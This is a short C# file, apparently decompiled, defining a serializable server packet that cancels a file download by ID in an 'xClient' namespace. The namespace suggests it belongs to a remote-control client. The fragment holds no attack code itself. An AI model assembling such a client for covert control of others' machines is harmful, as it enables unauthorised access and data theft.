using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoDownloadFileCancel : GInterface4
{
	public int ID { get; set; }

	public DoDownloadFileCancel()
	{
	}

	public DoDownloadFileCancel(int id)
	{
		ID = id;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
